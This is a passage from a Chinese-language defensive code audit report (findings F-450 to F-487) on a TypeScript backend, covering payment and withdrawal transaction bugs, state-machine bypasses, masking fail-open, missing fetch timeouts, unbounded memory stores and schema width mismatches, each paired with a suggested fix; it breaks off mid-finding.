- 触发路径：微信代扣成功回调 → 外层事务锁 `wechatPayContracts` 行 → 调 `placeOrder` / `completeOrder`。
- 根因：`order-service.ts:65,240` 均用模块级 `db`；`placeOrder → createOrder`（`payment-queries.ts:52 db.transaction`）、`completeOrder → updateOrderStatus`（`payment-queries.ts:127`）、`rechargeToken`、`earnPoints` 各自另借连接开独立事务，未接收 `tx`。
- 证据：`:680-691` 在外层 `tx` 内直接调用模块级函数；`:695-704` 才用 `tx` 更新合同。
- 影响面：内层独立提交。若外层 UPDATE/COMMIT 失败（合同未标记 success），订单已支付且 VIP/积分/充值已发放；微信重试会生成**新 orderNo** 再履约一次，重复发放且无法按合同幂等拦截。主池 `max=40` 时并发回调占用连接翻倍，存在互等/耗尽。
- 建议修法：`placeOrder/completeOrder` 增加 `tx` 并向下透传；或外层只做幂等占位，履约移出事务。
- 是否当场可修：是。

#### F-451 签约/解约事务内混用全局连接读写
- 严重度：P2
- 文件与行号：`routes/payment-recurring.ts:559-605,609-640`；`:575 getPlanBillingPeriod`（全局 db 读）、`:595/:631 setUserVipAutoRenew`（`:96-104` 全局 db update）
- 触发路径：签约/解约接口。
- 根因：外层 `tx` 已开，辅助函数仍用模块级 `db`。
- 证据：`setUserVipAutoRenew` 内 `db.update(userVips)`；外层回滚窗口内该更新已独立提交。
- 影响面：解约时合同回滚仍 active，但 `autoRenew=0`（或反之），界面与实际扣款状态分裂；并发下读到跨连接快照。
- 建议修法：两函数增加 `tx` 参数并在事务内调用。
- 是否当场可修：是。

> 本轮事务扫描负结论（**零新增**）：Grep `db.transaction` 命中 57 文件约 120 处，精读生产事务块 50+（payment-recurring、order-service、payment/order/commission/relay/edu/points/channel-quota/coupon/redemption/wallet/live-gifts/developer/finance/admin-shop/token-balance/chat/social/rbac/theme/ab-testing）；事务块内直接 `await fetch` **0 命中**（D1 的短信为 `void` 调用，不阻塞持锁）；F-436 已排除未重复计入。

### E 路：提现状态机与 db 长尾

#### F-452 代理提现全链路不冻结、无单号、驳回无守卫（已复核，P1）
- 严重度：P1
- 文件与行号：`routes/finance-extended.ts:231-285`（apply）、`:342-368`（approve）、`:371-397`（reject）；`routes/payment-extended.ts:137`（回调按 `partnerTradeNo` 匹配）
- 触发路径：`POST /finance/agent-withdrawal/apply` → 只插 `withdrawalFlows`（`:268-279`），不扣 `tokenQuantity`、不加 `frozen`、不写 `partnerTradeNo` → 回调按 `eq(partnerTradeNo, out_bill_no)` 永远匹配不到，该单不可能完成打款；`approve` 两次点击 0→1→2 无任何资金动作；`reject` 的 `where` 只有 `id`（`:391`），可把已完成(2)改回 3，而可用额校验只减 `status IN (0,1,2)`（`:262`）→ 已付款单被驳回后可用额复原，可再次申请，形成重复打款。
- 根因：该组路由未复用 `applyWithdrawal`/`rejectWithdrawal`，且状态机无前置状态断言。
- 证据：`:264-279` 无余额扣减与冻结；`:353-363` 仅 `currentStatus + 1`；`:383-392` 的 update 无 status 条件。
- 影响面：可重复提现（资金损失）；提现单无法闭环；冻结口径与主链路完全脱节。
- 建议修法：复用统一提现服务；补 `partnerTradeNo`；approve 只允许 0→1；reject 加 `status IN (0,1)` 条件。
- 是否当场可修：是。

#### F-453 第 5 条管理端写入口不释放冻结、不退款（已复核，P1）
- 严重度：P1
- 文件与行号：`routes/admin-extended/order-routes.ts:76-93`
- 触发路径：`POST /api/admin/shop/withdrawals/:id/approve|reject` → 直接 `status=2|3`，`where` 只有 `id`，无 frozen 释放、无 token 退还。
- 根因：与 F-452 同型的旁路写入口（注册于 `routes/index.ts:1150`）。
- 证据：`:84 const status = action === 'approve' ? 2 : 3`；`:85-89` 仅 `set({status, processedAt})`，无资金动作、无状态条件。
- 影响面：0→2 后回调只处理 0/1（`payment-extended.ts:147`），冻结永久沉淀；reject 无退款使 token 永久丢失；且可把任意终态改写。
- 建议修法：删除该路由或改调统一服务。
- 是否当场可修：是。

#### F-454 `finance-extended` 审批允许 1→2 二次释放冻结
- 严重度：P2
- 文件与行号：`routes/finance-extended.ts:557-597`
- 触发路径：`if (currentStatus >= 2)` 只拦 2，1 仍放行；`status = currentStatus + 1`（`:569`）使 processing→completed，并再次 `frozen -= amount`（`:581`）。
- 根因：状态机允许两步人工推进，且每步都释放冻结。
- 证据：`:569`、`:581`；守卫仅 `frozen >= amount`。
- 影响面：会挪用同一用户其它待审单的冻结额，导致那些单后续审批/驳回 400 卡死。
- 建议修法：仅允许 0→1；已完成只由回调推进。
- 是否当场可修：是。

#### F-455 `admin-shop` 新增/删除提现单绕过资金
- 严重度：P2
- 文件与行号：`routes/admin-shop-routes.ts:370-386,410-422`
- 触发路径：POST 未冻结即插单且可指定 `status`；DELETE 直接删行，申请时已 `token -= actual`、`frozen += actual` 的部分不退还。
- 根因：管理端 CRUD 直连表，未走提现服务。
- 证据：`:370-386` 的 insert 无资金动作；`:410-422` 的 delete 无退款。
- 影响面：删一条 pending 单即用户 token 与 frozen 双损失；POST 出 pending 单再审批会扣走他人冻结额。
- 建议修法：POST 走 `applyWithdrawal`，DELETE 仅允许终态且先退款。
- 是否当场可修：是。

#### F-456 退款审核 `action` 无运行时校验，可写任意状态
- 严重度：P2
- 文件与行号：`routes/user/payment-routes.ts:164-166`；`db/order-queries.ts:408-414`
- 触发路径：`request.body as { action?: ... }` 无 zod，`processRefund` 直接把字符串写库；传 `{"action":"completed"}` 即把退款置 completed。
- 根因：类型断言替代校验。
- 证据：`:164-166` 的 as 断言；`:408-414` 直接落库。
- 影响面：`completeTime` 为空、`eduOrders`/`orders` 未同步 refunded，且后续 `handleRefund` 因状态不在允许集拒绝处理，订单无法退款。
- 建议修法：zod enum 校验。
- 是否当场可修：是。

#### F-457 状态码 3/4 语义分裂导致后台统计缺项
- 严重度：P3
- 文件与行号：`routes/admin-shop-routes.ts:44-50,487`（驳回写 4）vs `db/commission-queries.ts:611`、`finance-extended.ts:386,608`、`finance.ts`（写 3）
- 触发路径：主链路驳回 → 3；商城后台驳回 → 4。
- 根因：无统一状态常量。
- 证据：`finance-extended.ts:498-502` 仅把 3 计为 rejected，四类计数之和 < 总数；`admin-shop` 按 rejected 筛选查 4。
- 影响面：主链路驳回单在商城后台显示为 failed；统计缺项。
- 建议修法：统一 4 或统一 3；统计改用 `NOT IN (0,1)`。
- 是否当场可修：是。

#### F-458 金额 `sum()::int` 溢出扩散（新查询点）
- 严重度：P3
- 文件与行号：`db/commission-queries.ts:649,653,664`；`db/agents-queries.ts:322-327,350-352`
- 触发路径：提现/佣金汇总或平台结算总额超过 `int4` 上限（约 ¥21,474,836.47 分）。
- 根因：`sum(...)::int`，且无 catch。
- 证据：上述四处的 SQL 强转；`getWithdrawal` 与提现资格校验无溢出兜底。
- 影响面：溢出即统计/提现资格校验 500（同 F-22 根因，新查询点）。
- 建议修法：改 `::bigint` 并在应用层转 number/字符串。
- 是否当场可修：是。

#### F-459 发票更新 userId 无 uuid 校验
- 严重度：P3
- 文件与行号：`routes/admin-invoices.ts:45-54`（`:46 z.string().min(1)`）；同文件 `:27`、`:35` 都校验 uuid
- 触发路径：`PUT` 传非 uuid 的 userId → PG `22P02` → 500。
- 根因：同文件内校验不一致。
- 证据：`:46` vs `:27`、`:35`。
- 影响面：错误语义不一致；日志噪声。
- 建议修法：改 `z.uuid()`。
- 是否当场可修：是。

---

## 二十、第十六轮新增（plugins兜底 / db零新增 / 路由最后矩阵 / schema列宽 / 横切超时）

> 基线：origin/main `c20e4a57`。五路并行；**B 路（db 兜底）本轮明确零新增**，其余四路新增 19 条。
> 主代理复核：F-460（`response-sanitizer.ts:244-254,524-535`）、F-461（`ws-auto-recovery.ts:99,157,229-259`）、F-465（`admin-extended/order-routes.ts:27-45`）、F-475（`chat-models.ts:1232-1246`）。

### A 路：plugins / config / workers / utils 兜底

#### F-460 `maskIdCard` 对 8-9 位值抛 RangeError，整包响应脱敏 fail-open（已复核，P2）
- 严重度：P2
- 文件与行号：`plugins/response-sanitizer.ts:251-253`（`maskIdCard`）、`:524-535`（`rewritePayload` 的 catch）
- 触发路径：任意 2xx JSON 响应含字段名匹配 `idcard`、值为 8/9 位字符串（如 `"12345678"`）→ `sanitizeData → maskValue → maskIdCard` → `'*'.repeat(s.length - 10)` 参数为负 → `RangeError`。
- 根因：阈值 `>= 8` 与公式隐含长度 ≥10 不一致。
- 证据：`:252 s.slice(0,6) + '*'.repeat(s.length - 10) + s.slice(-4)`；`:532-534 catch { return payload }` 注释「fail-open」。
- 影响面：该响应内**全部**敏感字段（phone/token/email）明文返回；`log-sanitizer.ts:42-43` 无 try/catch，同形态数据进 `request.log` 会把异常抛入业务路径（可致 500）。
- 建议修法：阈值改 `>= 11`，8-10 位直接返回 MASK，并 `Math.max(0, ...)` 兜底。
- 是否当场可修：是。

#### F-461 `ws-auto-recovery` 活动时间从不刷新，15 分钟后误恢复并耗尽配额（已复核，P2）
- 严重度：P2
- 文件与行号：`plugins/ws-auto-recovery.ts:99,157,229-243,259,296-307`；WS 注册点 `ws-ai:1195`、`ws-chat:874`、`ws-broadcast:661` 等 7 处
- 触发路径：任一 WS 插件注册且存在连接、进程运行 >15 分钟 → `runServiceCheck` 用从未被消息刷新过的 `lastActivityAt` 判「服务不活跃」→ `triggerRecovery`。
- 根因：缺「活动上报」入口；`lastActivityAt` 只在 `startMonitoring`（`:157`）与僵尸清理（`:259`）赋值，收发消息不更新。
- 证据：全文件 `lastActivityAt` 仅 4 处（`:99` 初始化、`:157`、`:229` 读取、`:259`）；`:237-242` 的触发条件 `hasConnections && inactiveMs > maxInactiveMs`。
- 影响面：每 30s 误调用全部插件 `cleanup()`，2.5 分钟内耗尽 `maxRecoveryAttempts=5`，此后真实故障不可恢复；每 30s 打一条 fatal。
- 建议修法：消息/心跳处刷新 `lastActivityAt`；恢复成功后重置；配额按时间窗复位。
- 是否当场可修：是。

#### F-462 `maskPhone` 对 7-8 位号码近乎明文
- 严重度：P3
- 文件与行号：`plugins/response-sanitizer.ts:244-247`
- 触发路径：字段名含 phone、值为 7 位（如 `1234567`）→ `123****4567`，原值 7 位全部出现；8 位暴露 7/8 位。
- 根因：`>= 7` 与固定保留前 3 + 后 4 冲突，未校验可隐藏位数。
- 证据：`:246` 的掩码公式。
- 影响面：短号码（固话/回填值）在响应与日志中近似明文。
- 建议修法：`>= 11` 才按 3+4 掩码，否则保留位数 ≤ len-2 或全 MASK。
- 是否当场可修：是。

> A 路另有负结论：`api-versioning/trace/otel/compression/swagger-theme` 无外部写面；`body-limits` 纯常量；`open-capability-registry` 构建期自校验且已防通配；`search-aspect` 热词重复与 F-123 同根因不重报；`money.div` 负除数舍入错但全仓无 `.div(` 调用；`idor-guard` 全仓未引用；`resilience` Bulkhead 无 `getBulkhead` 调用方。

### B 路：db 兜底（**零新增**）

> 对 `apps/api/src/db/*.ts` 100 个生产文件中未列入已扫清单的 4 个逐行读完，并对全部 100 个文件做 6 组 Grep：
> 1) `.limit(` 488 处/89 文件，未列文件 7 处均带唯一键或 `orderBy`；2) `deletedAt` 44 处/3 文件（均已扫），未列文件 0 处；3) `sum/::int` 299 处/60 文件，未列文件仅 3 处 `count(*)::int`（行数，不涉金额）；4) 循环内 `await db.` 9 处/9 文件，未列文件 0 处；5) catch 返回 `[]/null` 8 处/6 文件，未列文件 0 处；6) `where(eq(X.id, id))` 收窄 40+ 处，未列文件 0 处。
> 逐行结论：`chat-skills-queries.ts` 增删改均带 `(id,userId)` 双条件；`chat-sync-rev-queries.ts` UPSERT 原子递增 + `RETURNING` 校验；`chat-group-queries.ts` 批量移动先验归属并以 `returning` 计 affected；`chat-conversation-access.ts` owner 短路 + `status='accepted'`。
> 未判定：`chat-conversation-access.ts:34-52` 走 `dbRead` 副本，若生产配置 `DATABASE_READ_REPLICA_URL`，新建会话后立即读可能误 404（缺部署配置证据）。

### C 路：路由最后矩阵

#### F-463 `DELETE /admin/roles/:roleId/users/:userId` 的 roleId 漏 UUID 闸
- 严重度：P3
- 文件与行号：`routes/admin-extended/role-routes.ts:40`（`z.string().min(1)`）；对照 `:19` 已收紧为 `z.uuid()`、`:51/:63` 用 `uuidIdParamSchema`
- 触发路径：`DELETE /api/admin/roles/abc/users/<uuid>` → `removeUserRole(userId,'abc')` → `eq(userRoles.roleId,'abc')` → PG 22P02 → 500。
- 根因：同文件只改了 `:id` 两条，`:roleId` 一条沿用旧 schema。
- 证据：`:40` vs `:19`；`db/rbac-queries.ts:316-321` 直接把 roleId 送进 where。
- 影响面：存在性与服务故障同形；同资源三方法闸位不一致。
- 建议修法：复用 `uuidIdParamSchema` 拆成 `{roleId, userId}` 双 uuid schema。
- 是否当场可修：是。

#### F-464 `/admin/shop/payments/:id/ship` 无 UUID 闸、无发货状态机，且覆盖 remark
- 严重度：P3
- 文件与行号：`routes/admin-extended/order-routes.ts:58-75`（`:62` 仅 `idParamSchema`）；同文件 PUT `:29`、DELETE `:51` 均有 `isUuidString`
- 触发路径：`POST /api/admin/shop/payments/abc/ship` → 22P02 → 500；对 pending/cancelled 订单也可「发货」，重复调用覆盖上次备注。
- 根因：同资源三种方法只把形状闸加在 PUT/DELETE；发货仅写 `remark=已发货 <ISO>`（`:64,67,72`），无发货状态/时间列。
- 证据：`:62-72`；`schema/order.ts:43-47` 无 shipped 语义列。
- 影响面：错误语义不一致；发货不可审计；用户原始备注被覆盖。
- 建议修法：补 `isUuidString`；新增 `shippedAt/shippingStatus` 并限制「仅 paid 可发货」。
- 是否当场可修：部分（闸可立即加）。

#### F-465 `PUT /admin/orders/:id` 状态机旁路，不写时间戳、不进履约链（已复核，P2）
- 严重度：P2
- 文件与行号：`routes/admin-extended/order-routes.ts:27-45`
- 触发路径：管理员把 `refunded` 单改回 `paid`，或把 pending 直接改 `paid`/`refunded` → 两表 status 更新，`pay_time`/`refund_time`、`orders.paid_at`/`refund_time` 全为 NULL；`completeOrder`/退款服务未调用。
- 根因：PUT 把状态当普通字段直写，无状态迁移表、无时间戳派生、无终态回退限制。
- 证据：`:33 set({ ...body })`；`:39` 只拷 status；`schema/billing.ts:97-99`、`schema/order.ts:44-46` 的时间列；`drizzle/0213_phase5_backfill_orders_sync.sql:37-39` 证明 pay_time↔paid_at 应同步。
- 影响面：对账/报表按 `paid_at` 统计缺行；已退款单可被改回 paid 而无任何资金动作；退款单不写 `refund_time` 导致「退款待处理」判定错位。
- 建议修法：改为显式 `action` 枚举 + 允许迁移表，派生 `payTime/refundTime/cancelTime`；终态不可回退。
- 是否当场可修：是。

#### F-466 `ws/live-chat` 独缺单用户连接上限，`MAX_ROOMS` 只回收空房
- 严重度：P3
- 文件与行号：`routes/ws/live-chat.ts:31-35,60`；`websocket/chat-server.ts:121-138`
- 触发路径：同一 JWT 循环建立 `/ws/live-chat?roomId=<任意递增数字>`；无 `WsUserConnectionLimiter`；房间数超 `MAX_ROOMS` 且无可回收空房时仍照建。
- 根因：其余 8 个 ws 插件均 `new WsUserConnectionLimiter(...)`，唯一直接 `@fastify/websocket` 的本路由未接；`chat-server.ts:124-134` 只删空房。
- 证据：`plugins/ws-helpers.ts:108-133` 提供该限流器；全仓 `WsUserConnectionLimiter` 无 live-chat 命中。
- 影响面：单账号占大量 socket 与 rooms Map 条目（每房一份 conns Set），可放大内存。
- 建议修法：接入 limiter（如 8）；空房 LRU 之外增加强制上限拒绝。
- 是否当场可修：是。

#### F-467 `ws/live-chat` close/error 无条件重置全局限流窗口，重连即绕过 60 条/分钟
- 严重度：P3
- 文件与行号：`routes/ws/live-chat.ts:117-129`；`websocket/chat-server.ts:160-162,197`
- 触发路径：发送到限流边界 → 主动断开重连 → 窗口被整桶清空，继续刷屏；error + close 双触发连计两次。
- 根因：复用旧写法「断开即 reset」，未用 `utils/connection-registry.ts:74-85` 的 `releaseUserConnectionSlots`（该函数注释即为此缺陷而写）。
- 证据：`:121`、`:128` 无条件 reset；`connection-registry.ts:67-71` 明确记录该退化。
- 影响面：弹幕防洪可被重连绕过，落库+广播放大。
- 建议修法：接入 limiter 后用 `releaseUserConnectionSlots`，或连接数归零再 reset。
- 是否当场可修：是。

> C 路负结论：`admin-private-letters.ts`、`admin-sensitive-words.ts` 均为插件级 `requireAdmin` + `z.uuid()`，无新增；`admin-extended/{order,user,role}` 所有方法均 `requireAdmin`，不存在「缺鉴权」；`authenticate` 已查 status 0/3，故 `admin-extended` 用 `requireAdmin` 而非 `requireAdminRouteGuard` 不构成缺陷。
> C 路未判定：`live-chat` 房间无频道级 ACL（任意登录用户可 join 任意 roomId 读 200 条历史/发言），但 REST 腿 `GET/POST /live/:id/messages`（`mobile-chat-routes.ts:737,753`，仅 `requireAuth`）本就同口径，无法证明「更宽」；`chat-server.ts:206` 的 `msg.limit` 未做数值校验（`"abc"` → LIMIT NaN），未验证 PG 实际报错路径。

### D 路：schema 列宽与约束

#### F-468 视频任务 `task_id` Zod 上限 100 > 列宽 36，超长即 500
- 严重度：P3
- 文件与行号：`packages/database/src/schema/ai-config.ts:264`；`routes/ai-extended.ts:53,633-637`；迁移 `0038_missing_tables.sql:218`
- 触发路径：`POST /api/ai-ext/video-routes/tasks/create`（admin）传 37~100 字符 `taskId`。
- 根因：Zod `.max(100)`，DB 列 `varchar(36)`。
- 证据：`:53 taskId: z.string().max(100).optional()`；`:633` 原值直插，无截断。
- 影响面：合法的上游视频任务 ID（常 >36）全量 500，任务无法登记。
- 建议修法：Zod 改 `.max(36)` 或列扩至 128。
- 是否当场可修：是。

#### F-469 素材 `file_url` 允许 2000 字符，列宽 500
- 严重度：P3
- 文件与行号：`packages/database/src/schema/resource.ts:52`；`routes/admin-auth-edu-routes.ts:987,999,1015,1027`；迁移 `0018_resource_module.sql:23`
- 触发路径：`POST/PUT /api/admin/learn/materials` 传 501~2000 字符 URL。
- 根因：Zod `.max(2000)`，`file_url varchar(500)`。
- 证据：`:999 fileUrl: body.data.fileUrl`、`:1027 set({fileUrl})` 无裁剪。
- 影响面：带签名参数的长 OSS URL 写库失败 → 500，素材无法保存。
- 建议修法：Zod `.max(500)` 或列改 `text`。
- 是否当场可修：是。

#### F-470 `/ai/users` 手机号允许 32 字符，`users.phone` 仅 20
- 严重度：P3
- 文件与行号：`packages/database/src/schema/users.ts:49`；`routes/user/ai-users-routes.ts:29,107,124`
- 触发路径：`POST/PUT /api/ai/users`（requireAdmin）传 21~32 字符 phone。
- 根因：`aiUserItemSchema.phone = z.string().max(32)`，列为 `varchar(20).unique()`。
- 证据：`:29` 与 `:107 phone: body.data.phone ?? null`；`:124 patch.phone`。
- 影响面：含区号/分机的真实号码（>20）创建/更新即 500。
- 建议修法：Zod `.max(20)` 并做 E.164 归一。
- 是否当场可修：是。

#### F-471 提现 `method` 允许 32 字符，`withdrawal_flows.method` 仅 16
- 严重度：P3
- 文件与行号：`packages/database/src/schema/commission.ts:63`；`routes/distribution.ts:419,443`；迁移 `0035_wallet_commission.sql:63`
- 触发路径：`POST /api/distribution/withdraw` 传 17~32 字符 `method`。
- 根因：Zod `.max(32)`，列 `varchar(16) NOT NULL`。
- 证据：`:419 method: z.string().max(32)`；`:443` 直插。
- 影响面：该请求 500，提现申请不落库（资金语义另见 F-452）。
- 建议修法：Zod 枚举或 `.max(16)`。
- 是否当场可修：是。

> D 路负结论：① 23502：脚本提取 624 表/1484 个 notNull 无默认列，对 92 处 `insert` 候选逐一回看，显式对象缺失列 **0**；② 外键：448 处 `references` 全部指向目标表主键，无 uuid/varchar 错配；③ 余额/额度：7 个 `default(0)` 列语义与 -1 约定不冲突；④ `parseTokenQuotaFromFeatures` 返回 -1 但无调用点。
> D 路未判定：`play-testers.ts:16-17`、`service-inquiries.ts:16-17` 用无时区 `timestamp`，写入均用 DB `now()`，是否偏移取决于 PG 会话 TimeZone 与 Node TZ，缺部署证据。

### E 路：横切超时、静默失败与 N+1

#### F-472 ai-service 直连代理 fetch 无任何超时
- 严重度：P2
- 文件与行号：`routes/ai-tutor-routes.ts:54`；`routes/ai-frontend-routes.ts:194,319,401,435,456`
- 触发路径：`POST /api/ai-tutor/{explain,hint,quiz}`、`POST /api/ai/llm/{chat,fim}`、`POST /api/ai/mcp/tools/call` 及 MCP 三个 GET。
- 根因：上述 `await fetch(AI_SERVICE_URL…)` 均未传 `signal`；F-38 只覆盖 `aiServiceFetch`，F-49 只覆盖 `v1-mcp-gateway`，此处是残余直连。
- 证据：上述行号的 fetch 调用无第二个参数或参数无 `signal`。
- 影响面：ai-service 半开/卡死时请求挂到 undici 默认超时，连接槽与内存按并发累积。
- 建议修法：统一走 `fetchWithinDeadline` 或 `AbortSignal.timeout(20_000)`，超时映射 504。
- 是否当场可修：是。

#### F-473 OAuth 回调换 token/取用户无超时
- 严重度：P2
- 文件与行号：`routes/auth-extended.ts:3109,3117,3170,3182,3209`
- 触发路径：`POST /api/auth/:platform/callback`（github/apple 等）。
- 根因：`fetch('https://github.com/login/oauth/access_token')`、`api.github.com/user` 等无 `signal`，仅外层 try/catch 捕获网络异常。
- 证据：上述 5 处 fetch 无 abort 参数。
- 影响面：厂商黑洞时登录回调长期挂起，占 API 连接并放大登录超时。
- 建议修法：`AbortSignal.timeout(10_000)`，超时返回 504。
- 是否当场可修：是。

#### F-474 Coze SSE 代理无超时、不随客户端断连取消
- 严重度：P2
- 文件与行号：`routes/coze.ts:165-211`（`:179 fetch`）
- 触发路径：`POST /api/coze/chat-audio/one-to-one`（`reply.hijack()` 后进入）。
- 根因：hijack 后裸 `fetch` 无 `signal`，`request.raw.on('close')` 未绑定 abort，`reader.read()` 可永久等待。
- 证据：`:179` 的 fetch 参数；`:165-211` 无 abort 绑定。
- 影响面：一条挂起上游永久占用 undici socket + SSE 连接；客户端已断开仍持续转发。
- 建议修法：`onClose` 触发 `controller.abort()`，并加首帧/空闲超时。
- 是否当场可修：是。

#### F-475 chat 历史内存表无上限且 `model_name` 无长度上限（已复核，P2）
- 严重度：P2
- 文件与行号：`routes/chat-models.ts:386,1232-1246`；`:439-442`
- 触发路径：任意登录用户重复 `POST /api/chat/history/create`。
- 根因：模块级 `historyStore = new Map` 只 `set`，无 TTL/容量；删除仅按 id 手动；`model_name: z.string().min(1)` 无 `max`。
- 证据：`:1238-1246` 自增 id 与 `historyStore.set`；`:386` 的 Map 定义；schema 中 `model_name` 无 max。
- 影响面：内存单调增长，单条可塞超长字符串，可作内存 DoS。
- 建议修法：`model_name.max(200)`；Map 加容量上限/TTL 淘汰。
- 是否当场可修：是。

#### F-476 风控命中落库 fire-and-forget，首条失败即中断其余且只 warn
- 严重度：P3
- 文件与行号：`services/risk-engine-service.ts:264,272,347-380`
- 触发路径：任意走 `evaluateRisk` 的资金/登录操作命中多条规则。
- 根因：`void persistRiskHits(...)`；循环内 `await db.insert` 共用单 try，第 N 条失败后余下命中不再写，仅 `logger.warn`，调用方视为成功。
- 证据：`:264` 的 `void`；`:347-380` 的循环与单 catch。
- 影响面：风控审计证据静默缺失；规律性失败无告警。
- 建议修法：改单条多值 insert；失败计数入指标/死信。
- 是否当场可修：是。

#### F-477 design 降级存储 Map 无上限（500KB/条）
- 严重度：P3
- 文件与行号：`routes/design.ts:42,44,75,90`
- 触发路径：Redis 写/读异常期间，登录用户反复 `POST /api/design/preview`（html 上限 500KB）与 `POST /api/design/comments`。
- 根因：`previewFallback.set(key, previews)` 数组无上限、无 TTL、无 delete；`commentFallback` 按任意 `previewId` 建键。
- 证据：`:42`、`:44` 的模块级 Map；`:75`、`:90` 的写入。
- 影响面：Redis 故障窗口内进程内存无界增长，恢复后仍常驻。
- 建议修法：每用户/每 preview 条数上限 + 淘汰，或故障期直接 503。
- 是否当场可修：是。

#### F-478 活动过期任务逐条 UPDATE（N+1）
- 严重度：P3
- 文件与行号：`services/activity-status-service.ts:29-52`；入口 `workers/scheduler-worker.ts:487-488`
- 触发路径：每小时 `activity-status-hourly` 到期，过期活动积压。
- 根因：全量 SELECT 后 `for (const activity) await db.update(...)`，无 LIMIT、无集合更新。
- 证据：`:29-52` 的循环；`:487-488` 的调度。
- 影响面：活动积压时单轮上千次 DB 往返，拖慢 scheduler。
- 建议修法：单条 `UPDATE … WHERE status='published' AND end_at < now()`。
- 是否当场可修：是。

---

## 二十一、第十七轮新增（零散路由 / workers / server 生命周期 / clawdbot）

> 覆盖方式：五路并行只读审计。A=根目录零散路由组1；B=零散路由组2；C=workers；D=server.ts 生命周期与注册矩阵；E=learn/live/ai-extended/clawdbot。主代理复核了 F-479、F-490、F-492/C2、F-499、F-500。

#### F-479 `/interactions/comment` 评论别名层绕过敏感词过滤与父评论校验
- 严重度：P1
- 文件与行号：`routes/interactions.ts:141-156`；对照实现 `routes/comments.ts:251-281`；DB 出口 `db/comment-queries.ts:106-128`
- 触发路径：任意登录用户 `POST /api/interactions/comment`，body 含违规词，或 `parentId` 指向另一资源的评论。
- 根因：别名路由只做 `commentCreateSchema.safeParse` 后直调 `createComment`；`createComment` 是纯 insert，不含 `sanitizeUgcInput`，也不校验父评论是否存在/同资源。正式入口 `comments.ts` 在 `:261` 过敏感词、`:251-259` 校验父评论，该别名入口两者皆无。
- 证据：`interactions.ts:146-154` 无 `sanitizeUgcInput`、无 `findCommentById`；`comment-queries.ts:114-124` 原样落库 `content`/`parentId`。同仓 `Promise.all` 复核确认 `interactions.ts` 全文未 import `sanitizeUgcInput`。
- 影响面：合规过滤可被一个等价入口整体绕过（敏感/违法内容入库）；可把评论挂到任意 `parentId` 下（跨资源串楼、挂到已删评论形成孤儿链）。
- 建议修法：删除该别名路由，或复用 `comments.ts` 的 `sanitizeUgcInput` + 父评论校验；`createComment` 不应作为路由层直接出口。
- 是否当场可修：是。

#### F-480 公开轮播忽略 `startAt/endAt`，未到/已过期素材照常下发
- 严重度：P2
- 文件与行号：`routes/carousel.ts:31-33`；写入侧 `routes/admin/content/crud.ts:454-455,605-606`
- 触发路径：匿名 `GET /api/carousel`（公开路径），后台配置了未来生效或已下线的轮播项。
- 根因：公开查询只按 `status/isActive` 过滤，不判时间窗；后台写入了 `startAt/endAt` 但读侧未消费。
- 证据：`carousel.ts:31-33` 的 where 条件无时间比较；`crud.ts:454-455,605-606` 明确写入两列。
- 影响面：定时活动提前泄露、过期广告持续曝光（可能与已撤回的营销/价格宣传冲突）。
- 建议修法：公开查询补 `(start_at IS NULL OR start_at <= now()) AND (end_at IS NULL OR end_at > now())`。
- 是否当场可修：是。

#### F-481 协议查询未判生效日，未来协议提前生效
- 严重度：P2
- 文件与行号：`db/agreements-queries.ts:55-63`
- 触发路径：后台预录入 `effectiveDate` 为未来的用户协议/隐私政策版本后，任意用户 `GET` 协议内容/同意流程。
- 根因：查询只按 `isActive` + 版本倒序取首条，未过滤 `effective_date <= now()`。
- 证据：`:55-63` 的 where/order 无日期谓词。
- 影响面：未生效条款被提前展示并被用户“同意”，法律效力与合规审计风险。
- 建议修法：补 `effective_date <= now()` 谓词（取最新一条生效版本）。
- 是否当场可修：是。

#### F-482 应用版本发布先降级后插入且无事务
- 严重度：P3
- 文件与行号：`routes/app-version.ts:342-361`
- 触发路径：admin `POST` 新版本发布，插入失败（重号/超长/DB 抖动）。
- 根因：先把旧版本 `isLatest` 全部置 false，再 `insert` 新版本，两步不在同一事务；且表上无“仅一条 latest”的部分唯一索引。
- 证据：`:342-361` 的 update→insert 顺序无 `db.transaction`。
- 影响面：插入失败后线上无 `isLatest` 版本，客户端更新检查返回空（静默失效）。
- 建议修法：包事务；并加 `UNIQUE INDEX ... WHERE is_latest` 兜底。
- 是否当场可修：是。

#### F-483 评论列表 offset→page 折算丢失偏移
- 严重度：P3
- 文件与行号：`routes/interactions.ts:164-172`
- 触发路径：`GET /api/interactions/comment?limit=20&offset=30`。
- 根因：`page = Math.floor(offset/limit)+1`、`pageSize=limit`，DB 层按整页 `(page-1)*pageSize` 取；`offset` 非 `limit` 整数倍时被向下取整丢弃（offset=30 → page=2 → 实际 offset=20）。
- 证据：`:168-169` 的折算；响应体仍回显原始 `offset`，与数据实际起点不一致。
- 影响面：分页漂移、重复/遗漏条目；客户端按 offset 递进会出现固定错位。
- 建议修法：查询层直接支持 `offset`，或前端统一用 page。
- 是否当场可修：是。

#### F-484 点赞/关注不校验目标存在，外键冲突冒泡为 500
- 严重度：P3
- 文件与行号：`routes/interactions.ts:69-77,104-117`
- 触发路径：`POST /api/interactions/like` 传不存在的 `resourceId`；`POST /api/interactions/follow` 传不存在的 `userId`。
- 根因：直接 insert 关联行，未先确认目标存在；外键 23503 未捕获。
- 证据：`:69-77`、`:104-117` 无存在性查询、无 try/catch。
- 影响面：“目标不存在”与“服务故障”同形 500，前端无法区分。
- 建议修法：先查目标，404；或捕获 23503 映射 404。
- 是否当场可修：是。

#### F-485 admin FAQ 分页排序无唯一兜底且 `sortOrder` 恒 0
- 严重度：P3
- 文件与行号：`routes/admin-faq.ts:147-153,193`
- 触发路径：`GET /api/admin/faqs?page=2`，多条 `sortOrder` 相同（新建默认 0）。
- 根因：`ORDER BY sort_order` 无次级唯一键，Postgres 不保证稳定序；插入时未设 `sortOrder`，全部为 0。
- 证据：`:147-153` 的 order；`:193` 的 insert 无 sortOrder 赋值。
- 影响面：翻页重复/漏条；后台排序功能实际无效。
- 建议修法：`ORDER BY sort_order, id`；插入分配递增序号。
- 是否当场可修：是。

#### F-486 应用版本 PUT 不更新 `updatedAt`
- 严重度：P3
- 文件与行号：`routes/app-version.ts:399-403`（对照 `:484`）
- 触发路径：admin 编辑版本信息。
- 根因：`update` 的 set 未含 `updatedAt`，而同文件另一处更新含。
- 证据：`:399-403` 缺失字段；`:484` 有。
- 影响面：审计/缓存失效依据失真。
- 建议修法：补 `updatedAt: new Date()`。
- 是否当场可修：是。

#### F-487 用户组列表与成员列表对全体登录用户开放，可跨组枚举
- 严重度：P2
- 文件与行号：`routes/groups.ts:52,55-68,146-174`
